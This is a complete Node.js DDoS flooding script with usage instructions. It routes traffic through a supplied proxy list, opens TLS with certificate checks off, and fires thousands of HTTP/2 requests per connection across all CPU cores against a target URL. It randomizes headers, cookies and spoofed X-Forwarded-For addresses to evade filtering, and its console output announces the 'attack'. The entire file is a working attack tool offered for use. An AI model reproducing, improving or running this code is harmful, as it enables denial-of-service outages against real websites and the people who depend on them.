const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const fs = require("fs");
const cluster = require("cluster");
const { URL } = require("url");
const os = require("os");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
];

const referers = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://www.yahoo.com/",
  "https://duckduckgo.com/"
];

function generateRandomIP() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join(".");
}

function randomString(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let res = "";
  while (res.length < length) {
    res += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return res;
}

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8")
    .split(/\r?\n/)
    .filter(line => line.trim() !== "");
}

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

if (process.argv.length < 5) {
  console.log(`
Usage: node script.js <target> <duration in sec> <proxyFile>
Example: node script.js https://example.com 150 proxies.txt
  `);
  process.exit(1);
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const proxyFile = process.argv[4];
const proxies = readLines(proxyFile);
const parsedTarget = new URL(targetUrl);

class NetSocket {
  HTTP(options, callback) {
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);
    const connection = net.connect({
      host: options.host,
      port: options.port,
    });
    connection.setTimeout(0);
    connection.setKeepAlive(true, 0);
    
    connection.on("connect", () => connection.write(buffer));
    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      if (!response.includes("HTTP/1.1 200")) {
        connection.destroy();
        return callback(undefined, "error: invalid proxy response");
      }
      return callback(connection);
    });
    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout");
    });
  }
}

const Socker = new NetSocket();

function generateHeaders() {
  return {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":path": parsedTarget.pathname + (parsedTarget.search || "") + "?" + randomString(6),
    ":scheme": "https",
    "User-Agent": randomElement(userAgents),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": randomElement(referers),
    "X-Forwarded-For": generateRandomIP(),
    "Cookie": `session=${randomString(24)}; token=${randomString(32)}; __cfduid=${randomString(43)}`,
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
  };
}

function runFlooder() {
  for (let z = 0; z < 1000; z++) {
    process.nextTick(() => {
      const proxyAddr = randomElement(proxies);
      const parts = proxyAddr.split(":");
      if (parts.length < 2) return;
      const proxyOptions = {
        host: parts[0],
        port: parseInt(parts[1]),
        address: parsedTarget.host,
      };

      Socker.HTTP(proxyOptions, (connection, err) => {
        if (err || !connection) return;
        connection.setKeepAlive(true, 0);
        
        const tlsConn = tls.connect({
          socket: connection,
          host: parsedTarget.host,
          servername: parsedTarget.host,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2'],
        });
        tlsConn.setKeepAlive(true, 0);
        
        tlsConn.on("error", err => tlsConn.destroy());
        tlsConn.on("secureConnect", () => {
          try {
            const client = http2.connect(parsedTarget.href, {
              createConnection: () => tlsConn,
              settings: {
                maxConcurrentStreams: 5000,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
              }
            });
            client.on("error", err => client.destroy());
            
            for (let i = 0; i < 1000; i++) {
              const dynHeaders = generateHeaders();
              const req = client.request(dynHeaders);
              req.on("error", err => req.destroy());
              req.on("response", () => {
                req.close();
                req.destroy();
              });
              req.end();
            }
          } catch (e) {}
        });
      });
    });
  }
  setImmediate(runFlooder);
}

if (cluster.isMaster) {
  const numCPUs = os.cpus().length;
  console.log(`Starting attack on ${targetUrl} using ${numCPUs} workers for ${duration} seconds...`);
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  setTimeout(() => {
    console.log(`Attack duration of ${duration} seconds completed. Stopping attack...`);
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    process.exit(0);
  }, duration * 1000);
} else {
  runFlooder();
}
